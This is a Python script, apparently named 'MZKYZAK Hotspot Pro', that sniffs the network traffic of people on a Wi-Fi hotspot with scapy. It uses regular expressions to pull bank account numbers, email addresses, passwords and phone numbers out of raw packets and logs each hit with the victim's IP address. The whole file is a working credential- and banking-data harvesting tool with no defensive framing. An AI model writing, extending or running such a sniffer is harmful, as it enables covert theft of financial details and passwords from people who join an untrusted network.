#!/usr/bin/env python3
# ================================================================
# MZKYZAK HOTSPOT PRO — UNIVERSAL LOGGER
# WORKS ON: LINUX, ANDROID (TERMUX), WINDOWS (WSL), MACOS
# ================================================================

import re
import os
import sys
import json
import platform
from datetime import datetime

# Cross-platform log directory
if platform.system() == "Windows":
    LOG_DIR = os.path.join(os.environ['USERPROFILE'], "hotspot_logs")
elif platform.system() == "Android":
    LOG_DIR = "/sdcard/hotspot_logs"
else:
    LOG_DIR = "/opt/hostsop/logs"

os.makedirs(LOG_DIR, exist_ok=True)

LOG_FILE = os.path.join(LOG_DIR, "realtime_data.log")
IP_LOG = os.path.join(LOG_DIR, "ip_live.log")

# Patterns
REKENING = r"(\d{10,16})"
EMAIL = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
PASSWORD = r"(password|pass|pwd)[=:]\s*[\w\d]+"
PHONE = r"(\+?\d{2,3}[-.]?\d{8,12})"
IP_PATTERN = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"

def log_data(data_type, value, ip):
    with open(LOG_FILE, 'a') as f:
        f.write(f"\n[{datetime.now()}] IP: {ip}\n")
        f.write(f"  {data_type}: {value}\n")
        f.write("-" * 50 + "\n")

def sniff_packet(packet):
    # Simplified packet capture for cross-platform
    try:
        import scapy.all as scapy
        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load.decode(errors='ignore')
            ip = packet[scapy.IP].src if packet.haslayer(scapy.IP) else "Unknown"
            # Extract data
            rek = re.findall(REKENING, payload)
            email = re.findall(EMAIL, payload)
            pwd = re.findall(PASSWORD, payload, re.IGNORECASE)
            phone = re.findall(PHONE, payload)
            ips = re.findall(IP_PATTERN, payload)
            
            if rek:
                for r in rek:
                    log_data("💰 Rekening", r, ip)
            if email:
                for e in email:
                    log_data("📧 Email", e, ip)
            if pwd:
                for p in pwd:
                    log_data("🔑 Password", p, ip)
            if phone:
                for ph in phone:
                    log_data("📱 Phone", ph, ip)
    except ImportError:
        pass

def main():
    print(f"[🔥] MZKYZAK Hotspot Pro Logger")
    print(f"[📡] Logging to: {LOG_FILE}")
    print(f"[💀] Platform: {platform.system()}")
    
    try:
        from scapy.all import sniff
        sniff(prn=sniff_packet, store=0)
    except ImportError:
        print("[!] Scapy not installed. Use: pip install scapy")
        print("[!] Trying fallback: manual input capture...")
        # Fallback: capture from stdin if piped
        for line in sys.stdin:
            process_line(line)

def process_line(line):
    # Process text line from stdin
    ip = "Unknown"
    # Extract data
    rek = re.findall(REKENING, line)
    email = re.findall(EMAIL, line)
    pwd = re.findall(PASSWORD, line, re.IGNORECASE)
    phone = re.findall(PHONE, line)
    
    if rek:
        for r in rek:
            log_data("💰 Rekening", r, ip)
    if email:
        for e in email:
            log_data("📧 Email", e, ip)
    if pwd:
        for p in pwd:
            log_data("🔑 Password", p, ip)
    if phone:
        for ph in phone:
            log_data("📱 Phone", ph, ip)

if __name__ == "__main__":
    main()